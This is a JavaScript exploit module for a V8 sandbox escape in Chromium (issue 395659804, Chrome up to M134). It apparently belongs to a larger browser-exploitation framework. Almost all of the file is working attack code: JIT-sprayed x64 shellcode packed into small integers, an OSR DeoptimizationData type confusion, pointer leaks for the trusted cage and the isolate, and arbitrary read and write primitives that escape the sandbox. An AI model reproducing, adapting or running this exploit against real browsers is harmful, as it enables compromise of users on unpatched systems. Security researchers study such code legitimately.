/*
    V8 Sandbox escape, issue 395659804
    Build arbRead() & arbWrite() primitives + leak TRUSTED_CAGE_LEAK, ISOLATE_ADDR
    No easy way to check if the target is vulnerable: if not, it will crash
    Some offsets should be changed to work on <= M131
    This exploit uses shellcodes and currently works exclusively on x64 architectures

    Arbitrary code execution via OSR DeoptimizationData confusion

    Affected versions:
        - V8: < 13.5.86
        - Chrome Stable: <= M134

    Learning resources:
        - https://issues.chromium.org/issues/395659804
        - https://chromium-review.googlesource.com/c/v8/v8/+/6264504
        - https://chromium-review.googlesource.com/c/v8/v8/+/6264505
*/
{
    let versioncheck = FINGERPRINT.browser.chromium_version.major <= 134;
    if (!versioncheck)
        log("[-] Target likely not vulnerable to 395659804 (crash expected)", 1);
    if (FINGERPRINT.browser.chromium_version.major <= 131)
        log("[-] No support for <= M131 (crash expected)", 1);
    assert(FINGERPRINT.platform.bitness !== "32", "[-] V8 sandbox is disabled on 32-bit systems", 0);


    // Sandboxed getField & setField primitives
    let getField = function (obj, offset) {
        assert(isStrongTaggedPtr(obj), "[-] Invalid pointer: 0x" + hex(obj));
        return sbxMemory.getUint32(untagPtr(obj) + offset, true);
    }

    let setField = function (obj, offset, value) {
        assert(isStrongTaggedPtr(obj), "[-] Invalid pointer: 0x" + hex(obj));
        sbxMemory.setUint32(untagPtr(obj) + offset, value, true);
    }


    // Run a shellcode using SMIs JIT spray via OSR DeoptimizationData confusion
    let counter = 0;
    let spray = (shellcode, ...args) => {
        // Some code need to be unique on each call
        let unique_id = "// " + counter.toString();
        counter += 1;

        // Scratchpad array
        let scr_arr = Array(0x100).fill(0).map((_, i) => 0x21210002 | i << 7);
        let scr = sbxMemory.getUint32(untagPtr(addrOf(scr_arr) + 0x8), true) + 0x8 + 0x200;

        // Fake OSR target & OSR replacement victim
        const frame_size = 0x100;  // BytecodeArray::kFrameSizeOffset == DeoptimizationData::kOsrPcOffsetIndex
        const payload = [
            0, 0,
            ...Array(0x53).fill(0).map((_, i) => 0x21210000 + i),
            ...shellcode.map((x) => x >> 1)
        ];
        const code_str = Array(frame_size).fill(0).map((_, i) => `let v${i} = ${payload[i] ?? 0};`).join("\n");
        const fake_osr = new Function("p0", code_str + unique_id);
        const osr_func = new Function("loop", "for (let i = 0; i < loop; i++);" + unique_id);

        // Retrieve fake OSR target function data
        optimize(fake_osr);
        let target_addr = addrOf(fake_osr);
        let target_sfi = sbxMemory.getUint32(untagPtr(target_addr+0x10), true);
        let target_functiondata = sbxMemory.getUint32(untagPtr(target_sfi+0x4), true);

        // Allocate FeedbackVector
        osr_func(0x10);

        // Make a fake CodeWrapper pointing to baseline fake OSR target
        // sbxMemory.setUint32(untagPtr(scr), kCodeWrapperMap, true);  // not required for successful exploitation
        setField(scr, 0x4, target_functiondata);

        // Set fake OSR feedback
        let fn_addr = addrOf(osr_func);
        let feedback_cell = getField(fn_addr, 0x18);
        let feedback_val = getField(feedback_cell, 0x4);
        setField(feedback_val, 0x1c+2*0x4, scr | 2);

        // Trigger OSR, confusing BytecodeArray -> DeoptimizationData
        return osr_func(0x10000, ...args);
    }


    // Craft some useful shellcodes (use some dark magic to fit in SMIs :D)
    // Leak TRUSTED_CAGE_LEAK & TRUSTED_CAGE_BASE
    var TRUSTED_CAGE_LEAK = spray([
        0x08eb5d90,  // pop rbp
        0x08eb5d90,  // pop rbp
        0x08eb5d90,  // pop rbp
        0x08eb5d90,  // pop rbp
        0x08eb5d90,  // pop rbp
        0x08eb5d90,  // pop rbp
        0x08eb5d90,  // pop rbp
        0x08eb5d90,  // pop rbp

        0xebc03148,  // xor rax, rax
        0.1,
        0.1,
        0.1,
        0x90909090,
        0x90909090,
        0x90909090,
        0x08eb9090,

        0x08eb5b90,  // pop rbx
        0x08eb5a90,  // pop rdx
        0x08eb5f90,  // pop rdi
        0x08eb5990,  // pop rcx
        0x08eb5190,  // push rcx

        0x08eb07b0,  // mov al, 0x7
        0xebc10148,  // add rcx, rax
        0.1,
        0.1,
        0.1,
        0x90909090,
        0x90909090,
        0x90909090,
        0x08eb9090,

        0x08eb5058,  // pop rax; push rax
        0x08eb5790,  // push rdi
        0x08eb5290,  // push rdx
        0x08eb5390,  // push rbx

        0xc321894c,  // mov [rcx], r12; ret
    ], 0x4141414141414141n);
    log("[+] Leaked TRUSTED_CAGE_LEAK=0x" + hex(TRUSTED_CAGE_LEAK), 2);
    assert((TRUSTED_CAGE_LEAK & 0xffffffff00000000n) > 0n, "[-] Invalid TRUSTED_CAGE_LEAK pointer");


    // Leak ISOLATE_ADDR
    let ISOLATE_LEAK = spray([
        0x08eb5d90,  // pop rbp
        0x08eb5d90,  // pop rbp
        0x08eb5d90,  // pop rbp
        0x08eb5d90,  // pop rbp
        0x08eb5d90,  // pop rbp
        0x08eb5d90,  // pop rbp
        0x08eb5d90,  // pop rbp
        0x08eb5d90,  // pop rbp

        0xebc03148,  // xor rax, rax
        0.1,
        0.1,
        0.1,
        0x90909090,
        0x90909090,
        0x90909090,
        0x08eb9090,

        0x08eb5b90,  // pop rbx
        0x08eb5a90,  // pop rdx
        0x08eb5f90,  // pop rdi
        0x08eb5990,  // pop rcx
        0x08eb5190,  // push rcx

        0x08eb07b0,  // mov al, 0x7
        0xebc10148,  // add rcx, rax
        0.1,
        0.1,
        0.1,
        0x90909090,
        0x90909090,
        0x90909090,
        0x08eb9090,

        0x08eb5058,  // pop rax; push rax
        0x08eb5790,  // push rdi
        0x08eb5290,  // push rdx
        0x08eb5390,  // push rbx

        0xc329894c,  // mov [rcx], r13; ret
    ], 0x4141414141414141n);
    var ISOLATE_ADDR = ISOLATE_LEAK & ~0xfffn;
    log("[+] Leaked ISOLATE_ADDR=0x" + hex(ISOLATE_ADDR), 2);


    // Leak SANDBOX_BASE
    // Comment it out, as it is not required for exploitation
    /*
    var SANDBOX_BASE = spray([
        0x08eb5d90,  // pop rbp
        0x08eb5d90,  // pop rbp
        0x08eb5d90,  // pop rbp
        0x08eb5d90,  // pop rbp
        0x08eb5d90,  // pop rbp
        0x08eb5d90,  // pop rbp
        0x08eb5d90,  // pop rbp
        0x08eb5d90,  // pop rbp

        0xebc03148,  // xor rax, rax
        0.1,
        0.1,
        0.1,
        0x90909090,
        0x90909090,
        0x90909090,
        0x08eb9090,

        0x08eb5b90,  // pop rbx
        0x08eb5a90,  // pop rdx
        0x08eb5f90,  // pop rdi
        0x08eb5990,  // pop rcx
        0x08eb5190,  // push rcx

        0x08eb07b0,  // mov al, 0x7
        0xebc10148,  // add rcx, rax
        0.1,
        0.1,
        0.1,
        0x90909090,
        0x90909090,
        0x90909090,
        0x08eb9090,

        0x08eb5058,  // pop rax; push rax
        0x08eb5790,  // push rdi
        0x08eb5290,  // push rdx
        0x08eb5390,  // push rbx

        0xc331894c,  // mov [rcx], r14; ret
    ], 0x4141414141414141n);
    log("[+] Leaked SANDBOX_BASE=0x" + hex(SANDBOX_BASE), 2);
    assert((SANDBOX_BASE > 0x0n) && ((SANDBOX_BASE & 0xffffffffn) === 0x0n), "[-] Invalid SANDBOX_BASE pointer");
    */


    // Craft arbRead() primitive
    function arbRead(addr) {
        let addr_copy = addr + 0n;
        return spray([
            0x08eb5d90,  // pop rbp
            0x08eb5d90,  // pop rbp
            0x08eb5d90,  // pop rbp
            0x08eb5d90,  // pop rbp
            0x08eb5d90,  // pop rbp
            0x08eb5d90,  // pop rbp
            0x08eb5d90,  // pop rbp
            0x08eb5d90,  // pop rbp

            0xebc03148,  // xor rax, rax
            0.1,
            0.1,
            0.1,
            0x90909090,
            0x90909090,
            0x90909090,
            0x08eb9090,

            0x08eb5b90,  // pop rbx
            0x08eb5a90,  // pop rdx
            0x08eb5f90,  // pop rdi
            0x08eb5990,  // pop rcx
            0x08eb5190,  // push rcx

            0x08eb07b0,  // mov al, 0x7
            0xebc10148,  // add rcx, rax
            0.1,
            0.1,
            0.1,
            0x90909090,
            0x90909090,
            0x90909090,
            0x08eb9090,

            0x08eb5058,  // pop rax; push rax
            0x08eb5790,  // push rdi
            0x08eb5290,  // push rdx
            0x08eb5390,  // push rbx

            0xeb118b48,  // mov rdx, [rcx]
            0.1,
            0.1,
            0.1,
            0x90909090,
            0x90909090,
            0x90909090,
            0x08eb9090,

            0xeb32ff90,  // push [rdx]
            0.1,
            0.1,
            0.1,
            0x90909090,
            0x90909090,
            0x90909090,
            0x08eb9090,

            0xc3018f90,  // pop [rcx]; ret
        ], addr_copy);
    }


    // Craft arbWrite() primitive
    function arbWrite(addr, val) {
        spray([
            0x08eb5d90,  // pop rbp
            0x08eb5d90,  // pop rbp
            0x08eb5d90,  // pop rbp
            0x08eb5d90,  // pop rbp
            0x08eb5d90,  // pop rbp
            0x08eb5d90,  // pop rbp
            0x08eb5d90,  // pop rbp
            0x08eb5d90,  // pop rbp

            0xebc03148,  // xor rax, rax
            0.1,
            0.1,
            0.1,
            0x90909090,
            0x90909090,
            0x90909090,
            0x08eb9090,

            0x08eb5b90,  // pop rbx
            0x08eb5a90,  // pop rdx
            0x08eb5f90,  // pop rdi
            0x08eb5990,  // pop rcx
            0x08eb525a,  // pop rdx; push rdx
            0x08eb5190,  // push rcx

            0x08eb07b0,  // mov al, 0x7
            0xebc10148,  // add rcx, rax
            0.1,
            0.1,
            0.1,
            0x90909090,
            0x90909090,
            0x90909090,
            0x08eb9090,

            0xebc20148,  // add rdx, rax
            0.1,
            0.1,
            0.1,
            0x90909090,
            0x90909090,
            0x90909090,
            0x08eb9090,

            0x08eb5058,  // pop rax; push rax
            0x08eb5790,  // push rdi
            0x08eb5290,  // push rdx
            0x08eb5390,  // push rbx

            0xebc03148,  // xor rax, rax
            0.1,
            0.1,
            0.1,
            0x90909090,
            0x90909090,
            0x90909090,
            0x08eb9090,

            0xeb098b48,  // mov rcx, [rcx]
            0.1,
            0.1,
            0.1,
            0x90909090,
            0x90909090,
            0x90909090,
            0x08eb9090,

            0xeb128b48,  // mov rdx, [rdx]
            0.1,
            0.1,
            0.1,
            0x90909090,
            0x90909090,
            0x90909090,
            0x08eb9090,
            0x08eb9090,

            0xc3118948,  // mov [rcx], rdx; ret
        ], addr, val);
    }


    log("[+] Successfully escaped the V8 sandbox using issue 395659804", 2);
}
